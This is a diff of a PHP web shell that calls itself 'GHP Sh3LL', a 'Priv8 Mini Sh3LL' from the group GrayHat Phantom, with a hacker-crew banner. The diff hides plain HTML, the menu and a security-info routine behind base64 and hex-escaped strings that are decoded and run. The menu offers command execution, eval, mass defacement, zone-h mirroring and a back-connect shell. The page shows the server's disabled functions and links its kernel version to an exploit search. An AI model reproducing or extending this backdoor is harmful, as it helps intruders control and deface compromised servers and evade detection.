@@ -215,39 +215,12 @@ function logout() {
 }
 
 function info() {
-	global $GHP;
-	echo '
-<style>
-#wrapper{
-	width: 300px;
-	height: 300px;
-	overflow:auto;
-	padding:5px;
-    margin:auto;
-}
-.list {
-	border: 1px solid #232323;
-    text-align: left;
-    color:red;
-}
-p {
-	font-size:120%;
-	text-align:center;
-}
-</style>
-	
-	<p>Disabled Functions:</p><br><br><div id="wrapper">
-	';
-	if (empty($GHP[6]('disable_functions'))) {
-		echo '<center><font color=green>No Functions Disabled</font></center>';
-	}
-	else {
-		$disabled = $GHP[6]('disable_functions');
-		echo '<div class="list"><ul><li>';
-		echo str_replace(',','<li>', $disabled).'</ul></div></div>';
-	}
 
-	
+
+		 $secinfo = "\x9\x67\x6c\x6f\x62\x61\x6c\x20\x24\x47\x48\x50\x3b\xa\x9\x65\x63\x68\x6f\x20\x27\xa\x3c\x73\x74\x79\x6c\x65\x3e\xa\x23\x77\x72\x61\x70\x70\x65\x72\x7b\xa\x9\x77\x69\x64\x74\x68\x3a\x20\x33\x30\x30\x70\x78\x3b\xa\x9\x68\x65\x69\x67\x68\x74\x3a\x20\x33\x30\x30\x70\x78\x3b\xa\x9\x6f\x76\x65\x72\x66\x6c\x6f\x77\x3a\x61\x75\x74\x6f\x3b\xa\x9\x70\x61\x64\x64\x69\x6e\x67\x3a\x35\x70\x78\x3b\xa\x20\x20\x20\x20\x6d\x61\x72\x67\x69\x6e\x3a\x61\x75\x74\x6f\x3b\xa\x7d\xa\x2e\x6c\x69\x73\x74\x20\x7b\xa\x9\x62\x6f\x72\x64\x65\x72\x3a\x20\x31\x70\x78\x20\x73\x6f\x6c\x69\x64\x20\x23\x32\x33\x32\x33\x32\x33\x3b\xa\x20\x20\x20\x20\x74\x65\x78\x74\x2d\x61\x6c\x69\x67\x6e\x3a\x20\x6c\x65\x66\x74\x3b\xa\x20\x20\x20\x20\x63\x6f\x6c\x6f\x72\x3a\x72\x65\x64\x3b\xa\x7d\xa\x70\x20\x7b\xa\x9\x66\x6f\x6e\x74\x2d\x73\x69\x7a\x65\x3a\x31\x32\x30\x25\x3b\xa\x9\x74\x65\x78\x74\x2d\x61\x6c\x69\x67\x6e\x3a\x63\x65\x6e\x74\x65\x72\x3b\xa\x7d\xa\x3c\x2f\x73\x74\x79\x6c\x65\x3e\xa\x9\xa\x9\x3c\x70\x3e\x44\x69\x73\x61\x62\x6c\x65\x64\x20\x46\x75\x6e\x63\x74\x69\x6f\x6e\x73\x3a\x3c\x2f\x70\x3e\x3c\x62\x72\x3e\x3c\x62\x72\x3e\x3c\x64\x69\x76\x20\x69\x64\x3d\x22\x77\x72\x61\x70\x70\x65\x72\x22\x3e\xa\x9\x27\x3b\xa\x9\x69\x66\x20\x28\x65\x6d\x70\x74\x79\x28\x24\x47\x48\x50\x5b\x36\x5d\x28\x27\x64\x69\x73\x61\x62\x6c\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73\x27\x29\x29\x29\x20\x7b\xa\x9\x9\x65\x63\x68\x6f\x20\x27\x3c\x63\x65\x6e\x74\x65\x72\x3e\x3c\x66\x6f\x6e\x74\x20\x63\x6f\x6c\x6f\x72\x3d\x67\x72\x65\x65\x6e\x3e\x4e\x6f\x20\x46\x75\x6e\x63\x74\x69\x6f\x6e\x73\x20\x44\x69\x73\x61\x62\x6c\x65\x64\x3c\x2f\x66\x6f\x6e\x74\x3e\x3c\x2f\x63\x65\x6e\x74\x65\x72\x3e\x27\x3b\xa\x9\x7d\xa\x9\x65\x6c\x73\x65\x20\x7b\xa\x9\x9\x24\x64\x69\x73\x61\x62\x6c\x65\x64\x20\x3d\x20\x24\x47\x48\x50\x5b\x36\x5d\x28\x27\x64\x69\x73\x61\x62\x6c\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73\x27\x29\x3b\xa\x9\x9\x65\x63\x68\x6f\x20\x27\x3c\x64\x69\x76\x20\x63\x6c\x61\x73\x73\x3d\x22\x6c\x69\x73\x74\x22\x3e\x3c\x75\x6c\x3e\x3c\x6c\x69\x3e\x27\x3b\xa\x9\x9\x65\x63\x68\x6f\x20\x73\x74\x72\x5f\x72\x65\x70\x6c\x61\x63\x65\x28\x27\x2c\x27\x2c\x27\x3c\x6c\x69\x3e\x27\x2c\x20\x24\x64\x69\x73\x61\x62\x6c\x65\x64\x29\x2e\x27\x3c\x2f\x75\x6c\x3e\x3c\x2f\x64\x69\x76\x3e\x3c\x2f\x64\x69\x76\x3e\x27\x3b\xa\x9\x7d";
+
+		 $dec_secinfo = decode_code($secinfo);
+		 wews($dec_secinfo);
 
 }
 //FUNCTIONS END ==========================================================================
@@ -255,127 +228,15 @@ p {
 $dec_home=decode_code($home);
 
   
-echo '<html>
-<head>
-
-  <link rel="preconnect" href="https://fonts.gstatic.com">
-  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300&display=swap" rel="stylesheet">
-  <link rel="icon" href="https://i.ibb.co/TvLxpPW/white-transparent.png" type="image/x-icon"> 
-  <title>GHP Sh3LL</title>
-  <style type="text/css">
-
-  ::-webkit-scrollbar {
-    width: 12px;
-    }
-     
-    ::-webkit-scrollbar-track {
-        -webkit-box-shadow: inset 0 0 6px #39FF14; 
-        border-radius: 10px;
-    }
-     
-    ::-webkit-scrollbar-thumb {
-        border-radius: 10px;
-        -webkit-box-shadow: inset 0 0 6px #39FF14; 
-    }
-    body {
-      background-color: black;
-      color: white;
-      font-family: "Open Sans", sans-serif;
-      font-size: 15px;
-      margin:0;
-    }
-    tr {
-      padding:0;
-    }
-    .head {
-      background-color: #232323;
-      padding:10px 20px 10px 10px;
-      font-size:80%;
-
-    }
-    .main {
-      margin-top: 20px;
-    }
-
-    .menu {
-    font-size:80%;
-      background-color: #232323;
-      padding:15px 10px 1px 10px;
-      border-top: 1px solid black;
-    }
-    pre {
-      color:#39FF14;
-    }
-    .menu ul form li a[yawa=k]{
-      color: white;
-      padding:8px;
-      background-color: #232323;
-      transition: background-color 1s ease-out;
-      text-decoration:none;
-    }
-    .menu ul form li a:hover{
-      color:black;
-      background:white;
-    }
-    .menu ul {
-      list-style-type: none;
-      margin: 0;
-      padding: 0;
-    }
-    .menu ul form li {
-      display: inline;
-      margin:0;
-      padding:0;
-
-    }
-    img[id="logo"] {
-      float:right;
-      animation: rotation 4s infinite linear;
-    }
-    @keyframes rotation {
-      0%{
-       transform: rotateY(0deg);
-    }
-    100%{
-        transform: rotateY(360deg);
-    }
-    }
-  </style>
-</head>
-<body>
-<div class="head"> <img id="logo" src="https://i.ibb.co/TvLxpPW/white-transparent.png" width="100vw">
-<div style="font-size:80%:">'; 
+echo $GHP[1]('PGh0bWw+CjxoZWFkPgoKICA8bGluayByZWw9InByZWNvbm5lY3QiIGhyZWY9Imh0dHBzOi8vZm9udHMuZ3N0YXRpYy5jb20iPgogIDxsaW5rIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzMj9mYW1pbHk9T3BlbitTYW5zOndnaHRAMzAwJmRpc3BsYXk9c3dhcCIgcmVsPSJzdHlsZXNoZWV0Ij4KICA8bGluayByZWw9Imljb24iIGhyZWY9Imh0dHBzOi8vaS5pYmIuY28vVHZMeHBQVy93aGl0ZS10cmFuc3BhcmVudC5wbmciIHR5cGU9ImltYWdlL3gtaWNvbiI+IAogIDx0aXRsZT5HSFAgU2gzTEw8L3RpdGxlPgogIDxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+CgogIDo6LXdlYmtpdC1zY3JvbGxiYXIgewogICAgd2lkdGg6IDEycHg7CiAgICB9CiAgICAgCiAgICA6Oi13ZWJraXQtc2Nyb2xsYmFyLXRyYWNrIHsKICAgICAgICAtd2Via2l0LWJveC1zaGFkb3c6IGluc2V0IDAgMCA2cHggIzM5RkYxNDsgCiAgICAgICAgYm9yZGVyLXJhZGl1czogMTBweDsKICAgIH0KICAgICAKICAgIDo6LXdlYmtpdC1zY3JvbGxiYXItdGh1bWIgewogICAgICAgIGJvcmRlci1yYWRpdXM6IDEwcHg7CiAgICAgICAgLXdlYmtpdC1ib3gtc2hhZG93OiBpbnNldCAwIDAgNnB4ICMzOUZGMTQ7IAogICAgfQogICAgYm9keSB7CiAgICAgIGJhY2tncm91bmQtY29sb3I6IGJsYWNrOwogICAgICBjb2xvcjogd2hpdGU7CiAgICAgIGZvbnQtZmFtaWx5OiAiT3BlbiBTYW5zIiwgc2Fucy1zZXJpZjsKICAgICAgZm9udC1zaXplOiAxNXB4OwogICAgICBtYXJnaW46MDsKICAgIH0KICAgIHRyIHsKICAgICAgcGFkZGluZzowOwogICAgfQogICAgLmhlYWQgewogICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMjMyMzIzOwogICAgICBwYWRkaW5nOjEwcHggMjBweCAxMHB4IDEwcHg7CiAgICAgIGZvbnQtc2l6ZTo4MCU7CgogICAgfQogICAgLm1haW4gewogICAgICBtYXJnaW4tdG9wOiAyMHB4OwogICAgfQoKICAgIC5tZW51IHsKICAgIGZvbnQtc2l6ZTo4MCU7CiAgICAgIGJhY2tncm91bmQtY29sb3I6ICMyMzIzMjM7CiAgICAgIHBhZGRpbmc6MTVweCAxMHB4IDFweCAxMHB4OwogICAgICBib3JkZXItdG9wOiAxcHggc29saWQgYmxhY2s7CiAgICB9CiAgICBwcmUgewogICAgICBjb2xvcjojMzlGRjE0OwogICAgfQogICAgLm1lbnUgdWwgZm9ybSBsaSBhW3lhd2E9a117CiAgICAgIGNvbG9yOiB3aGl0ZTsKICAgICAgcGFkZGluZzo4cHg7CiAgICAgIGJhY2tncm91bmQtY29sb3I6ICMyMzIzMjM7CiAgICAgIHRyYW5zaXRpb246IGJhY2tncm91bmQtY29sb3IgMXMgZWFzZS1vdXQ7CiAgICAgIHRleHQtZGVjb3JhdGlvbjpub25lOwogICAgfQogICAgLm1lbnUgdWwgZm9ybSBsaSBhOmhvdmVyewogICAgICBjb2xvcjpibGFjazsKICAgICAgYmFja2dyb3VuZDp3aGl0ZTsKICAgIH0KICAgIC5tZW51IHVsIHsKICAgICAgbGlzdC1zdHlsZS10eXBlOiBub25lOwogICAgICBtYXJnaW46IDA7CiAgICAgIHBhZGRpbmc6IDA7CiAgICB9CiAgICAubWVudSB1bCBmb3JtIGxpIHsKICAgICAgZGlzcGxheTogaW5saW5lOwogICAgICBtYXJnaW46MDsKICAgICAgcGFkZGluZzowOwoKICAgIH0KICAgIGltZ1tpZD0ibG9nbyJdIHsKICAgICAgZmxvYXQ6cmlnaHQ7CiAgICAgIGFuaW1hdGlvbjogcm90YXRpb24gNHMgaW5maW5pdGUgbGluZWFyOwogICAgfQogICAgQGtleWZyYW1lcyByb3RhdGlvbiB7CiAgICAgIDAlewogICAgICAgdHJhbnNmb3JtOiByb3RhdGVZKDBkZWcpOwogICAgfQogICAgMTAwJXsKICAgICAgICB0cmFuc2Zvcm06IHJvdGF0ZVkoMzYwZGVnKTsKICAgIH0KICAgIH0KICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5Pgo8ZGl2IGNsYXNzPSJoZWFkIj4gPGltZyBpZD0ibG9nbyIgc3JjPSJodHRwczovL2kuaWJiLmNvL1R2THhwUFcvd2hpdGUtdHJhbnNwYXJlbnQucG5nIiB3aWR0aD0iMTAwdnciPgo8ZGl2IHN0eWxlPSJmb250LXNpemU6ODAlOiI+'); 
     
 		echo '<font color=red>CWD:</font> 	'.$GHP[3]().'<br><font color=red>SERVER ADDRESS:</font> '.$_SERVER['SERVER_ADDR'].' <font color=red>YOUR ADDRESS:</font>'.$_SERVER['REMOTE_ADDR']
 
-		.' <br><font color=red>UNAME:</font> '.$GHP[4]().'<a style="color:red;" target="_blank"href="'.'https://www.exploit-db.com/search?q='.$GHP[4](),'">  [ExploitDB]</a>	
+		.' <br><font color=red>UNAME:</font> '.$GHP[4]().'<a style="color:red;" target="_blank"href="'.'https://www.exploit-db.com/search?q='.$GHP[4]().'">  [ExploitDB]</a>	
 		<br><font color=red>PHP Version:</font> '.$GHP[5]().'</div>';
     ;
 		
-    echo '
-   
-	</div>
-
-<div class="menu">
-  <ul>
-  <form method="POST">
-    <li><a href="?home" yawa="k" >home</a>
-    <li><a href="?cmd" yawa="k">cmd</a>
-    <li><a href="?eval" yawa="k">eval</a>
-    <li><a href="?mass" yawa="k">mass</a>
-    <li><a href="?mirror" yawa="k" >zone-h</a>
-    <li><a href="?bc" yawa="k">bc</a>
-    <li><a href="?info" yawa="k">Sec. Info</a>
-    <li style="float:right"><a href="?logout" yawa="k">logout</a>
-  </form>
-  <li>
-</ul>
-</div>
-
-  
-<div class="main"> 
-
-';
+    echo $GHP[1]('ICAgCgk8L2Rpdj4KCjxkaXYgY2xhc3M9Im1lbnUiPgogIDx1bD4KICA8Zm9ybSBtZXRob2Q9IlBPU1QiPgogICAgPGxpPjxhIGhyZWY9Ij9ob21lIiB5YXdhPSJrIiA+aG9tZTwvYT4KICAgIDxsaT48YSBocmVmPSI/Y21kIiB5YXdhPSJrIj5jbWQ8L2E+CiAgICA8bGk+PGEgaHJlZj0iP2V2YWwiIHlhd2E9ImsiPmV2YWw8L2E+CiAgICA8bGk+PGEgaHJlZj0iP21hc3MiIHlhd2E9ImsiPm1hc3M8L2E+CiAgICA8bGk+PGEgaHJlZj0iP21pcnJvciIgeWF3YT0iayIgPnpvbmUtaDwvYT4KICAgIDxsaT48YSBocmVmPSI/YmMiIHlhd2E9ImsiPmJjPC9hPgogICAgPGxpPjxhIGhyZWY9Ij9pbmZvIiB5YXdhPSJrIj5TZWMuIEluZm88L2E+CiAgICA8bGkgc3R5bGU9ImZsb2F0OnJpZ2h0Ij48YSBocmVmPSI/bG9nb3V0IiB5YXdhPSJrIj5sb2dvdXQ8L2E+CiAgPC9mb3JtPgogIDxsaT4KPC91bD4KPC9kaXY+CgogIAo8ZGl2IGNsYXNzPSJtYWluIj4gCgo=');
 
 
 // NAVIGATION
@@ -414,27 +275,7 @@ echo '<html>
 
 
   else {
-    echo '<br><pre style="color:lime;text-align:center;">
- 
-
-   ______                 __  __      __      
-  / ____/________ ___  __/ / / /___ _/ /_     
- / / __/ ___/ __ `/ / / / /_/ / __ `/ __/     
-/ /_/ / /  / /_/ / /_/ / __  / /_/ / /_       
-\____/_/  _\__,_/\__, /_/ /_/\__,_/\__/       
-   / __ \/ /_  _/____/___  / /_____  ____ ___ 
-  / /_/ / __ \/ __ `/ __ \/ __/ __ \/ __ `__ \
- / ____/ / / / /_/ / / / / /_/ /_/ / / / / / /
-/_/   /_/ /_/\__,_/_/ /_/\__/\____/_/ /_/ /_/ 
-
-              est. 2020              
-
-GrayHat Phantom | Priv8 Mini Sh3LL
-
-<font style="font-size:10px;">
-X-m3n | K1LL3rB4LL | Bloos3rpent  |
-    Null | Mr.supremo | ~R1C0  |  Ph.Luffy  |  Mr.GonzX  |  t1m3l00p  |  Sh4nks  |  Mr.n00b13  |  Ph.Juda$$  |  Cyberfrost  |  Laxx</font>
-</pre>';
+    echo $GHP[1]('PGJyPjxwcmUgc3R5bGU9ImNvbG9yOmxpbWU7dGV4dC1hbGlnbjpjZW50ZXI7Ij4KIAoKICAgX19fX19fICAgICAgICAgICAgICAgICBfXyAgX18gICAgICBfXyAgICAgIAogIC8gX19fXy9fX19fX19fXyBfX18gIF9fLyAvIC8gL19fXyBfLyAvXyAgICAgCiAvIC8gX18vIF9fXy8gX18gYC8gLyAvIC8gL18vIC8gX18gYC8gX18vICAgICAKLyAvXy8gLyAvICAvIC9fLyAvIC9fLyAvIF9fICAvIC9fLyAvIC9fICAgICAgIApcX19fXy9fLyAgX1xfXyxfL1xfXywgL18vIC9fL1xfXyxfL1xfXy8gICAgICAgCiAgIC8gX18gXC8gL18gIF8vX19fXy9fX18gIC8gL19fX19fICBfX19fIF9fXyAKICAvIC9fLyAvIF9fIFwvIF9fIGAvIF9fIFwvIF9fLyBfXyBcLyBfXyBgX18gXAogLyBfX19fLyAvIC8gLyAvXy8gLyAvIC8gLyAvXy8gL18vIC8gLyAvIC8gLyAvCi9fLyAgIC9fLyAvXy9cX18sXy9fLyAvXy9cX18vXF9fX18vXy8gL18vIC9fLyAKCiAgICAgICAgICAgICAgZXN0LiAyMDIwICAgICAgICAgICAgICAKCkdyYXlIYXQgUGhhbnRvbSB8IFByaXY4IE1pbmkgU2gzTEwKCjxmb250IHN0eWxlPSJmb250LXNpemU6MTBweDsiPgpYLW0zbiB8IEsxTEwzckI0TEwgfCBCbG9vczNycGVudCAgfAogICAgTnVsbCB8IE1yLnN1cHJlbW8gfCB+UjFDMCAgfCAgUGguTHVmZnkgIHwgIE1yLkdvbnpYICB8ICB0MW0zbDAwcCAgfCAgU2g0bmtzICB8ICBNci5uMDBiMTMgIHwgIFBoLkp1ZGEkJCAgfCAgQ3liZXJmcm9zdCAgfCAgTGF4eDwvZm9udD4KPC9wcmU+');
   
   }
 echo '
